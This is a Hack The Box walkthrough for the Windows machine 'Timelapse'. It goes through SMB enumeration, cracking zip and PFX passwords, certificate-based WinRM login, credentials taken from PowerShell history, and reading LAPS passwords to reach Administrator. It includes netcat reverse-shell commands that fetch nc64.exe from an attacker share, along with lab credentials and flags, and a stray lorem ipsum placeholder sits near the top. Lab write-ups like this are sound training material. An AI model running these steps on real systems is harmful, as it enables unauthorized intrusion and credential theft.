---
layout: single
title: Timelapse - Hack The Box
excerpt: "Timelapse is an easy-rated Windows machine from Hack The Box. The box is quiet realistic where you work your way to the initial foothold starting with some locked files on a open share. I struggled a bit on what to do with found certificates, but once figured out it was smooth sailing to Administrator. This wasn't the most enjoyable box I've done, neither was it particularly bad."
date: 2022-04-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-timelapse/timelapse_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
tags:  
  - windows
  - easy
  - smb
  - pfx
  - history
---

![](/assets/images/htb-writeup-timelapse/timelapse_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Machine has not yet retired, writeup will be released when retired! Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
<br>

----------------

# USER

### Step 1

**nmap:**
```bash
➜  timelapse nmap -Pn -n -p- 10.10.11.152 --open -v
[... snip ...]
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
51418/tcp open  unknown

➜  timelapse nmap -Pn -n -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,51418 -sCV 10.10.11.152
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-31 15:20:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2022-03-31T15:21:54+00:00; +8h02m39s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
51418/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows


➜  timelapse sudo nmap -sU -p- --open 10.10.11.152 -v
[... snip ...]
PORT   STATE SERVICE
53/udp open  domain
```

**dirb:**
```bash
N/A
```

**nikto:**
```bash
N/A
```

**ffuf:**
```bash
N/A
```

**smbclient:**
```bash
➜  timelapse smbclient -L 10.10.11.152
Enter WORKGROUP\void's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share
```

**rpcclient:**
```bash
➜  timelapse rpcclient -U "" dc01.timelapse.htb
Enter WORKGROUP\'s password: 
rpcclient $>
```

- `dc01.timelapse.htb` from nmap

-----------------

### Step 2
First thing we find is a globally open SMB share, enumerate it.
```bash
➜  timelapse smbclient \\\\10.10.11.152\\Shares
Enter WORKGROUP\voids password: 
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

\Dev
  .                                   D        0  Mon Oct 25 21:40:06 2021
  ..                                  D        0  Mon Oct 25 21:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

\HelpDesk
  .                                   D        0  Mon Oct 25 17:48:42 2021
  ..                                  D        0  Mon Oct 25 17:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 16:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 16:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 16:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 16:57:44 2021

smb: \> prompt off
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (23.0 KiloBytes/sec) (average 23.0 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (3627.9 KiloBytes/sec) (average 2656.7 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (886.7 KiloBytes/sec) (average 2270.4 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (963.6 KiloBytes/sec) (average 1548.7 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (507.0 KiloBytes/sec) (average 1438.0 KiloBytes/sec)
```

Before going through the LAPS files, we can try to brute force the zip. Remember to beautify the hash file so that it starts and ends with `$pkzip2$`.
```bash
➜  Dev unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password

➜  Dev /usr/sbin/zip2john winrm_backup.zip > zip.hash
➜  Dev vim zip.hash                                  
➜  Dev hashcat -a0 -m17210 zip.hash /usr/share/wordlists/rockyou.txt
[... snip ...]
$pkzip2$1*2*2*0*965* [... snip ...] *$/pkzip2$:supremelegacy
                                                 
Session..........: hashcat
Status...........: Cracked

➜  Dev unzip -P supremelegacy winrm_backup.zip 
Archive:  winrm_backup.zip
  inflating: legacyy_dev_auth.pfx
```

-------------

### Step 3
Try to crack the certificate (`.pfx`) password.
```bash
➜  Dev /usr/share/john/pfx2john.py legacyy_dev_auth.pfx | john --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin
[... snip ...]
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:01:06 DONE (2022-03-31 12:18) 0.01499g/s 48458p/s 48458c/s 48458C/s thuglife06..thug211
```

Testing the new password against LDAP, SMB and WinRM we find our first set of working creds, over LDAP `legacy:thuglegacy`. 
```bash
➜  timelapse crackmapexec ldap 10.10.11.152 -u legacy -p thuglegacy                                                  
LDAP        10.10.11.152    389    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\legacy:thuglegacy 
➜  timelapse crackmapexec smb 10.10.11.152 -u legacy -p thuglegacy
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] timelapse.htb\legacy:thuglegacy STATUS_ACCESS_DENIED 
➜  timelapse crackmapexec winrm 10.10.11.152 -u legacy -p thuglegacy
WINRM       10.10.11.152    5986   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:timelapse.htb)
WINRM       10.10.11.152    5986   DC01             [*] https://10.10.11.152:5986/wsman
WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\legacy:thuglegacy "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f4a3de153a0>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"
```

However, testing the ldap credentials against everything and anything results in errors.. so lets go back to the `.pfx` file. 
Reading about the `.pfx` we should be able to extract a `.key` and `.crt` file, which we can later use for evil-winrm login.
```bash
➜  Dev openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out priv.key
Enter Import Password: thuglegacy
Enter PEM pass phrase: thuglegacy
Verifying - Enter PEM pass phrase: thuglegacy
➜  Dev openssl pkcs12 -in legacyy_dev_auth.pfx  -clcerts -nokeys -out pfx.crt
Enter Import Password: thuglegacy

➜  Dev evil-winrm -i 10.10.11.152 -c pfx.crt -k priv.key -p -u -S 
Enter PEM pass phrase: thuglegacy
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
98f42c5d696089eac85401c445d1e2f9
```


--------------

# ROOT

### Step 1 
With manual information we see that the privileges are low and no interesting groups.
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /all
USER INFORMATION
----------------

User Name         SID
================= ============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We find three new users, `Administrator`, `svc_deploy` and `TRX`.
```powershell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX
```


-----------------

### Step 2
From the SMB share we found some LAPS documentation, so the privesc probably have something to do with this.
Microsoft’s LAPS is a client side extension which runs a single dll that manages password (``AdmPwd.dll``).
The dll is present in ``C:\Program Files\LAPS\CSE\AdmPwd.dll``, download it.

```powershell
*Evil-WinRM* PS C:\Program Files\LAPS\CSE> download "C:\Program Files\LAPS\CSE\AdmPwd.dll"
```

However we are a low privileged user so we can't poison the dll.. For a quick win check the history and  we find a new set of creds: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
And also got code execution as user `svc_deploy`
```powershell
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Replicate to get a new reverse shell.
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users\legacyy\Documents> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\legacyy\Documents> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
timelapse\svc_deploy

➜  /opt impacket-smbserver share . -smb2support

*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {//10.10.14.2/share/nc64.exe 10.10.14.2 4488 -e powershell}

➜  timelapse rlwrap nc -lvnp 4488                                                                                    
listening on [any] 4488 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.152] 52197
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

-----------

### Step 3
Enumerating the directories we find `laps.ps1`
```powershell
PS C:\Users\svc_deploy\Desktop> type laps.ps1
$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$computers | Export-Csv -path c:\users\danny\desktop\"LAPS-$((Get-Date).ToString("MM-dd-yyyy")).csv" -NoTypeInformation
```

Run the script:
```powershell
PS C:\Users\svc_deploy\Desktop> ./laps.ps1

Name  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime
----  -----------        -------------            ---------------------------
WEB01                                                                        
DEV01                                                                        
DB01                                                                         
DC01  dc01.timelapse.htb 6+e(2G,L;TK5+eGy%gJ8s.2X 132936070633235489
```

A new set of creds: `Administrator:6+e(2G,L;TK5+eGy%gJ8s.2X`

```powershell
PS C:\Users\svc_deploy\Desktop> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
PS C:\Users\svc_deploy\Desktop> $p = ConvertTo-SecureString '6+e(2G,L;TK5+eGy%gJ8s.2X' -AsPlainText -Force
PS C:\Users\svc_deploy\Desktop> $c = New-Object System.Management.Automation.PSCredential ('Administrator', $p)
PS C:\Users\svc_deploy\Desktop> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
timelapse\administrator

PS C:\Users\svc_deploy\Desktop> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {//10.10.14.2/share/nc64.exe 10.10.14.2 4499 -e powershell}

➜  timelapse rlwrap nc -lvnp 4499
listening on [any] 4499 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.152] 64806
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

--------------

### Step 4
The flag, `root.txt`, is not in it's normal directory (`C:\Users\Administrator\Desktop\root.txt`). 
Looking around we find the flag in user `TRX` directory.

```powershell
PS C:\Users\TRX\Desktop> type root.txt
5f0405eed578c041a6f9ad86d0318e82
```

------

# References
**.pfx to .key & .crt:**
https://medium.com/beingcoders/easy-way-to-convert-pfx-to-crt-key-files-in-10-minutes-683849242c65
